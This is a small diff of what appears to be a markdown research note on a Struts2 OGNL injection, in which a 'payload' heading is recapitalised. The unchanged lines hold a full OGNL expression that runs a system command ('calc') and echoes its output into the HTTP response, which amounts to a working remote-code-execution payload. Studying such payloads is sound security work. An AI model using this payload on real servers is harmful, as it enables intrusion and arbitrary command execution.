@@ -26,7 +26,7 @@ IDE: `idea 2020.1.1 ULTIMATE`
 
 ![{FDDB7DE1-A721-4C4B-A719-BEA79D4F0AC0}_20200619170042]({FDDB7DE1-A721-4C4B-A719-BEA79D4F0AC0}_20200619170042.jpg)
 
-## payload
+## Payload
 
 `%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}`
 
